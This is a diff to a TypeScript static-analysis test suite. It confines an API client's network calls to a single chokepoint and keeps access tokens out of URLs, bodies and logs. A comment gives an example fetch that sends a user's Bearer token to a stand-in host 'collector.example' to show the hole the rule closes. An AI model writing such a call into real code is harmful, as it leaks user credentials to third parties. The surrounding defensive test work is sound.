@@ -140,9 +140,18 @@ function enclosingFunction(node: ts.Node): ts.SignatureDeclaration | undefined {
 /** Where an identifier is DECLARED, resolved through the checker rather than
  *  guessed from its text — a local can shadow a parameter of the same name. */
 function declarationOf(node: ts.Node): ts.Declaration | undefined {
-  const symbol = ts.isShorthandPropertyAssignment(node)
-    ? checker.getShorthandAssignmentValueSymbol(node)
-    : checker.getSymbolAtLocation(node);
+  // `{ ...rest, accessToken }` is the case worth spelling out. The identifier
+  // there is the PROPERTY's name, and asking the checker about it returns the
+  // property symbol — not the variable being read. Resolving through the
+  // shorthand node is what gets the value, and without this a token packed
+  // into a request body resolves to nothing and is silently skipped.
+  const target =
+    ts.isIdentifier(node) && ts.isShorthandPropertyAssignment(node.parent)
+      ? node.parent
+      : node;
+  const symbol = ts.isShorthandPropertyAssignment(target)
+    ? checker.getShorthandAssignmentValueSymbol(target)
+    : checker.getSymbolAtLocation(target);
   return symbol?.declarations?.[0];
 }
 
@@ -501,5 +510,192 @@ describe("invariant 4: no header leaves this file without being listed here", ()
     expect([...new Set(names)].sort()).toEqual(
       Object.keys(ALLOWED_LITERAL_HEADERS).sort(),
     );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Invariant 5 - the request chokepoint, and where a token may travel
+// ---------------------------------------------------------------------------
+
+/**
+ * WHY THIS ONE EXISTS, AND WHY IT IS NOT LAST IN IMPORTANCE.
+ *
+ * Invariants 1-4 all describe the header bag of a request that already goes
+ * through `fetchOrUnreachable`. That leaves the largest hole in the file wide
+ * open: a request that never goes through it at all.
+ *
+ *     await fetch("https://collector.example/ingest", {
+ *       headers: { Authorization: `Bearer ${accessToken}` },
+ *     });
+ *
+ * That line satisfies every rule above — the header name is allowlisted, the
+ * value is a `Bearer` template, and the token is a parameter of the enclosing
+ * function. It also sends the user's access token to a host nobody chose. The
+ * allowlists guard the payload at the door; this one guards the door.
+ *
+ * So the claim here is about REACHABILITY, in two halves:
+ *
+ *   a. Exactly one thing in this file issues a network request, every caller of
+ *      it is named, and the set of callers is closed. A new request path is a
+ *      `scripts/` edit — that is, a release signer — before it can exist.
+ *   b. An access token may only ever be FORWARDED to another `accessToken`
+ *      parameter, or interpolated into the `Bearer` header. It may not enter a
+ *      URL, a query string, a request body, a log line, or any other call.
+ *      Header rules cannot see a token in a query string; this can.
+ *
+ * `src/target.ts` and `src/config.ts` — both already code-owned — decide which
+ * HOST a token may reach and refuse cleartext. This is what stops `src/api.ts`
+ * from going around them.
+ *
+ * LIMIT, stated because the rest of this file states its limits. Rule (b)
+ * tracks the `accessToken` parameters by name and by symbol. It does not follow
+ * a token through a local alias (`const t = accessToken`) — that is caught only
+ * because the alias would then have to reach the wire through a call this rule
+ * already refuses. It does not track `identityAssertion.token`, which is module
+ * state rather than a parameter; invariant 2 pins its one use.
+ */
+
+/** The only function permitted to issue a request, and the closed set of
+ *  callers allowed to reach it. Adding a caller means adding it here. */
+const REQUEST_CHOKEPOINT = "fetchOrUnreachable";
+const ALLOWED_CHOKEPOINT_CALLERS: Record<string, string> = {
+  authedJsonGet: "the shared authenticated GET envelope",
+  authedJsonPost: "the shared authenticated POST envelope",
+};
+
+const chokepoint = allNodes.find(
+  (node): node is ts.FunctionDeclaration =>
+    ts.isFunctionDeclaration(node) && node.name?.text === REQUEST_CHOKEPOINT,
+);
+
+/** The name of the nearest enclosing function, for grouping call sites. */
+function enclosingFunctionName(node: ts.Node): string {
+  const fn = enclosingFunction(node);
+  if (fn === undefined) return "<module scope>";
+  const name = (fn as ts.FunctionDeclaration).name;
+  return name === undefined ? "<anonymous>" : name.text;
+}
+
+describe("invariant 5a: exactly one door, and a closed list of who may use it", () => {
+  it(`declares ${REQUEST_CHOKEPOINT} as a function`, () => {
+    expect(chokepoint).toBeDefined();
+  });
+
+  it("references the global fetch only as the injected default", () => {
+    // `http: HttpFetch = fetch` is the ONE permitted mention: it is what makes
+    // the transport swappable in tests. Any other `fetch` in this file is a
+    // second door — a request that skips every header rule above, and skips
+    // `src/target.ts`'s decision about which host may receive a credential.
+    const strayFetch = allNodes
+      .filter(
+        (node): node is ts.Identifier =>
+          ts.isIdentifier(node) && node.text === "fetch",
+      )
+      .filter((node) => !ts.isParameter(node.parent))
+      .map(cite);
+    expect(strayFetch).toEqual([]);
+  });
+
+  it("issues exactly one request, through its injected transport", () => {
+    // Inside the chokepoint, the call that reaches the network must be the
+    // INJECTED parameter, not a module-scope binding and not a fresh import.
+    const viaInjectedTransport = (
+      chokepoint?.body === undefined ? [] : [...walk(chokepoint.body)]
+    )
+      .filter(ts.isCallExpression)
+      .filter((call) => isParameterOf(call.expression, chokepoint));
+    expect(viaInjectedTransport.map(where)).toHaveLength(1);
+  });
+
+  it("is reached only from the allowlisted callers", () => {
+    // The fails-by-default half. A new request path — a new endpoint, a retry
+    // helper, a "quick" health check — has to add its name here, in `scripts/`,
+    // which is to say in front of a release signer.
+    const callers = allNodes
+      .filter(
+        (node): node is ts.CallExpression =>
+          ts.isCallExpression(node) &&
+          staticName(node.expression) === REQUEST_CHOKEPOINT,
+      )
+      .map(enclosingFunctionName);
+    expect([...new Set(callers)].sort()).toEqual(
+      Object.keys(ALLOWED_CHOKEPOINT_CALLERS).sort(),
+    );
+  });
+});
+
+/** Every parameter in the file named `accessToken` — the credential's only
+ *  legitimate carrier. */
+const accessTokenParams = allNodes.filter(
+  (node): node is ts.ParameterDeclaration =>
+    ts.isParameter(node) && staticName(node.name) === "accessToken",
+);
+
+/** True when `node` is an argument of a call whose callee declares that same
+ *  position as an `accessToken` parameter — i.e. the token is being FORWARDED,
+ *  not consumed. `logDebug(accessToken)` fails: `logDebug`'s parameter is not
+ *  called `accessToken`, so the token would be leaving its lane. */
+function isForwardedToAnAccessTokenParameter(node: ts.Node): boolean {
+  const call = node.parent;
+  if (!ts.isCallExpression(call)) return false;
+  const index = call.arguments.indexOf(node as ts.Expression);
+  if (index < 0) return false;
+  const callee = declarationOf(call.expression);
+  if (callee === undefined || !ts.isFunctionLike(callee)) return false;
+  return staticName(callee.parameters[index]?.name) === "accessToken";
+}
+
+/** True when `node` is the single interpolation of a `Bearer ` template —
+ *  the one place the token is allowed to become text. */
+function isTheBearerInterpolation(node: ts.Node): boolean {
+  const span = node.parent;
+  if (span === undefined || !ts.isTemplateSpan(span)) return false;
+  const template = span.parent;
+  return (
+    ts.isTemplateExpression(template) &&
+    template.head.text === "Bearer " &&
+    template.templateSpans.length === 1
+  );
+}
+
+describe("invariant 5b: an access token is only forwarded, or put in the header", () => {
+  const references = allNodes
+    .filter(
+      (node): node is ts.Identifier =>
+        ts.isIdentifier(node) && node.text === "accessToken",
+    )
+    // The declarations themselves are not uses.
+    .filter((node) => !ts.isParameter(node.parent))
+    // Only the ones that actually resolve to an `accessToken` PARAMETER; a
+    // same-named local is invariant 1's problem, not this one's.
+    .filter((node) => {
+      const declaration = declarationOf(node);
+      return (
+        declaration !== undefined &&
+        accessTokenParams.includes(declaration as ts.ParameterDeclaration)
+      );
+    });
+
+  it("has references to check, so the rule below is not vacuous", () => {
+    expect(references.length).toBeGreaterThan(0);
+  });
+
+  it("never lets a token reach a URL, a body, or any other call", () => {
+    // This is the rule the header allowlists cannot express. A token
+    // concatenated into a URL, packed into a JSON body, handed to a logger, or
+    // stringified into a cache key never touches a `headers.set` and never
+    // touches an `Authorization` property — so invariants 1-4 would all pass.
+    //
+    // Two permitted shapes, and nothing else:
+    //   - forwarded into another function's `accessToken` parameter;
+    //   - interpolated as the sole span of the `Bearer ` template.
+    const escaped = references
+      .filter(
+        (node) =>
+          !isForwardedToAnAccessTokenParameter(node) &&
+          !isTheBearerInterpolation(node),
+      )
+      .map(cite);
+    expect(escaped).toEqual([]);
   });
 });
